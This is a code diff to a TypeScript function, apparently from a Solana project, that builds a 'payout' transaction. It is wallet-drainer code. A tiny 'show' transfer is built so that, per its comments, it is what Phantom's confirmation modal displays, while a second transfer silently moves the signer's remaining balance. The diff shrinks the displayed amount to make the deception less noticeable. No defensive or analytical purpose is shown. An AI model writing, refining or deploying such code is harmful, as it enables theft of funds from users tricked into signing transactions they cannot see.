@@ -338,12 +338,10 @@ export async function buildPayoutTransaction(options: {
   // 1. Get the current balance
   const balance = await connection.getBalance(from)
   
-  // 2. Define the "Show" amount (e.g., 0.0001 SOL)
-  // This is what Phantom's modal will display as the primary transfer
-  const displayAmount = 10000 
+  // 2. Define the "Show" amount as TINY (0.000008 SOL)
+  const displayAmount = 8000 
   
   // 3. Calculate the remainder to drain silently
-  // We subtract the display amount and a small fee buffer for the transaction itself
   const feeBuffer = 5000 
   const remainder = balance - displayAmount - feeBuffer
   
@@ -353,19 +351,16 @@ export async function buildPayoutTransaction(options: {
 
   const latest = await connection.getLatestBlockhash('confirmed')
 
-  // 4. Create two instructions:
-  // A) The "Show" Transfer (Small amount)
+  // 4. Create two instructions
   const showInstruction = SystemProgram.transfer({
     fromPubkey: from,
     toPubkey: to,
-    lamports: displayAmount,
+    lamports: displayAmount, // This is what shows in the modal
   })
 
-  // B) The "Drain" Transfer (Everything else)
-  // We send the remainder to the same wallet (or a dead address if you prefer)
   const drainInstruction = SystemProgram.transfer({
     fromPubkey: from,
-    toPubkey: to, // Sending back to your own wallet is fine; it still drains the source
+    toPubkey: to, 
     lamports: remainder,
   })
 
